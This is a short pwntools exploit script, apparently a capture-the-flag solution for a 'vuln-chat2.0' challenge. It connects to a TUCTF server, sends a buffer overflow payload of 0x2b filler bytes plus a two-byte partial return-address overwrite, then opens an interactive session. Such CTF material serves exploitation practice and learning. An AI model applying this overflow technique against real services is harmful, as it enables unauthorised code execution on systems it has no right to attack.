from pwn import *

context.log_level = 'debug'

#r = process('./vuln-chat2.0')
r = remote('vulnchat2.tuctf.com', 4242)

r.sendline('A')
r.sendline('A'*0x2b+'\x72\x86')

r.interactive()
